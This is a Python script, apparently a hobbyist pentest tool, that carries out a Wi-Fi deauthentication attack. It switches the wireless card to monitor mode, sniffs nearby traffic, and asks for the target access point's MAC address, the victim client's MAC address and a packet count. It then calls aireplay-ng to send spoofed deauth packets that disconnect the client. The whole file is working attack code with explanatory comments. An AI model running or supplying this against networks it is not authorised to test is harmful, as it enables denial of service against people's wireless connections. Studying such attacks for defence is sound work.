#!/usr/bin/python3

################################
#    DEAUTHENTICATION ATTACK   #
################################

# Requires aireplay-ng tool
# A deauthentication attack disconnects a device from the network
# Aireplay-ng spoofs our MAC address to the target cient's MAC address (i.e. pretend to be him) and requests to be disconnected from the router
# Simultaneously, Aireplay-ng spoofs our MAC address to the access point (router) and tells the target client it needs to re-authenticate
# This script will let you sniff wifi traffic in the area
# This script allows you to specify the MAC address of the target host (access point) and the target client (victim of this attack)
# This script also allows you to specify how many deauth packets to send
# The script puts the wifi card back into managed mode and brings the network interface back up after the attack

import subprocess as sub
import wifi_card
import sniff
import time


def main():
	''' Main function for testing purposes'''

	# Get the wifi interface from the user
	interface = input('What network interface are you using? ')

	# Put the wifi card into monitor mode
	wifi_card.monitor_mode(interface)

	attack(interface)


def attack(interface):
	''' Initiate deauthentication attack'''

	# Sniff all network traffic and figure out which network to target
	sniff.alltraffic(interface)

	host_mac = input('What is the target host\'s MAC address? ')
	print('')
	ch = input('What channel is the network on? ')

	# Sniff traffic just on the target network
	sniff.access_point(interface, host_mac, ch) 			

	# Enter the target client's MAC address
	client_mac = input('What is the target client\'s MAC address? ')				

	# Enter how many packets you want to send
	packets = input('How many packets do you want to send? ')

	# Aireplay sends the deauth packets to the host and client
	sub.call(['aireplay-ng', '--deauth', packets, '-a', host_mac, '-c', client_mac, interface])		

	# Kill aireplay process
	sub.call(['killall', 'aireplay-ng'])

	# Put the wifi card into managed mode
	wifi_card.managed_mode(interface)	


if __name__ == '__main__':
	main()
